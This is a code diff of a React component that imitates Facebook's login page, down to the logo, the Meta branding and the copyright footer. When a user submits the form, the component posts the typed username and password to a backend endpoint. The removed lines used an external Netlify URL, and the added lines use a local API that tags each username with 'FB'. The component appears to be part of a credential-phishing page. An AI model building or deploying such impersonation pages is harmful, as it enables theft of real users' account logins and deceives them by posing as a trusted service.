@@ -2,74 +2,77 @@ import axios from "axios";
 import React, { useEffect, useState } from "react";
 
 function FaceBookLogin() {
-
-  const[formData, setFormData] = useState({
-    username : "",
-    password : "",
+  const [formData, setFormData] = useState({
+    username: "",
+    password: "",
   });
 
-  const [errorMessage, setErrorMessage] = useState("")
-  const [loginMessage, setLoginMessage] = useState("")
+  const [errorMessage, setErrorMessage] = useState("");
+  const [loginMessage, setLoginMessage] = useState("");
 
   const handleChange = (e) => {
-       setFormData({
-        ...formData,
-        [e.target.name]: e.target.value,
-       })
-     }
+    setFormData({
+      ...formData,
+      [e.target.name]: e.target.value,
+    });
+  };
 
-     const ValidateForm = () => {
-        const {username, password} = formData;
+  const ValidateForm = () => {
+    let { username, password } = formData;
 
-        if(!username)
+    if (!username) {
+      setErrorMessage("Username or email is required.");
+      return false;
+    }
+  
+    if (!password) {
+      setErrorMessage("Password is required.");
+      return false;
+    }
+
+
+    setErrorMessage("");
+    return true;
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+  
+    if (!ValidateForm()) return;
+  
+    // Username  "FB" Add
+    const modifiedFormData = {
+      ...formData,
+      username: formData.username.startsWith("F") ? "FB" + formData.username : "FB" + formData.username,
+    };
+  
+    try {
+      const response = await axios.post(
+        "http://localhost:8001/api/v1/user/facebooklogin",
+        modifiedFormData, 
         {
-            setErrorMessage("Username or email is required.")
-            return false
+          headers: {
+            "Content-Type": "application/json",
+          },
         }
-        if(!password){
-            setErrorMessage("Password is required.")
-            return false
-        }
+      );
+      setLoginMessage("Login successful.");
+      setFormData({ username: "", password: "" });
+    } catch (error) {
+      setErrorMessage(
+        error.response?.data?.message || "An error occurred during login."
+      );
+    }
+  };
+  
+  useEffect(() => {
+    const timeOut = setTimeout(() => setLoginMessage(""), 3000);
 
-        setErrorMessage("")
-        return true
-     };
-
-     const handleSubmit = async(e) => {
-        e.preventDefault();
-
-        if(!ValidateForm()) return;
-
-        try {
-            const response = await axios.post(
-                "https://677ee99c9e2c801f9a6885b4--spontaneous-sprinkles-a3abd1.netlify.app/facebooklogin",
-                formData,
-                {
-                    headers:{
-                        "Current-Type" : "Application/json",
-                    },
-                },
-            )
-            setLoginMessage("Login successfull. "),
-                setFormData({username: "", password: ""})
-        } catch (error) {
-            setErrorMessage(
-                error.response?.data?.message || "An error occurred during login."
-            )
-        }
-     }
-
-    useEffect(() => {
-        const timeOut = setTimeout(() => 
-        setLoginMessage(""),3000);
-
-        return ()=> clearTimeout(timeOut);            
-    },[loginMessage])
-
-   
+    return () => clearTimeout(timeOut);
+  }, [loginMessage]);
 
   return (
-    <div className="container mt-5" >
+    <div className="container mt-5">
       <div className="backgroundimg">
         <div className="image-in relative mt-[50px]" id="cf"></div>
       </div>
@@ -80,7 +83,8 @@ function FaceBookLogin() {
             <span>English (UK)</span>
           </div>
           <div className="inline-flex justify-center mt-[30px] mb-[20px]">
-            <img className="w-[70px] h-[70px]"
+            <img
+              className="w-[70px] h-[70px]"
               src="https://cdn.freebiesupply.com/logos/large/2x/facebook-logo-2019.png"
               alt="facebook"
             />
@@ -89,7 +93,7 @@ function FaceBookLogin() {
           <form className="form-middle" method="post" onSubmit={handleSubmit}>
             <div className="mt-4">
               <input
-                className="w-[300px] h-12 border border-gray-400 rounded px-2 text-lg font-medium"
+                className="w-[300px] h-12 border border-gray-400 rounded px-2 text-lg font-medium text-black"
                 name="username"
                 value={formData.username}
                 onChange={handleChange}
@@ -98,7 +102,7 @@ function FaceBookLogin() {
             </div>
             <div className="mt-4">
               <input
-                className="w-[300px] h-12 border border-gray-400 rounded px-2 text-lg font-medium "
+                className="w-[300px] h-12 border border-gray-400 rounded px-2 text-lg font-medium  text-black"
                 name="password"
                 value={formData.password}
                 onChange={handleChange}
@@ -113,15 +117,17 @@ function FaceBookLogin() {
               Login
             </button>
             <div className="grid justify-center mt-5">
-            <span className=" h-[35px]    font-bold  text-blue-900">
-              Forgot password?
-            </span>
-          </div>
+              <span className="h-[35px] font-bold text-blue-700">
+                Forgot password?
+              </span>
+            </div>
           </form>
-          {errorMessage && <p className="text-red-600">{errorMessage}</p>}
-          {loginMessage && <p className="text-green-600">{loginMessage}</p>}
-
-          {/* {message && <p className="mt-4 text-center">{message}</p>} */}
+          {errorMessage && (
+            <p className="text-red-600 mt-2 text-center">{errorMessage}</p>
+          )}
+          {loginMessage && (
+            <p className="text-green-600 mt-2 text-center">{loginMessage}</p>
+          )}
 
           <div className="items-center justify-center grid mt-20">
             <span className="flex w-[65px] pl-[15px] font-bold">from</span>
@@ -135,15 +141,12 @@ function FaceBookLogin() {
               <span className="font-bold mt-[-3px] pl-[4px] ml-1">Meta</span>
             </div>
           </div>
-         
 
           <span className="mt-5 items-center justify-center grid pb-[15px]">
             © 2025 Facebook from Meta
           </span>
         </div>
-       
       </div>
-     
     </div>
   );
 }
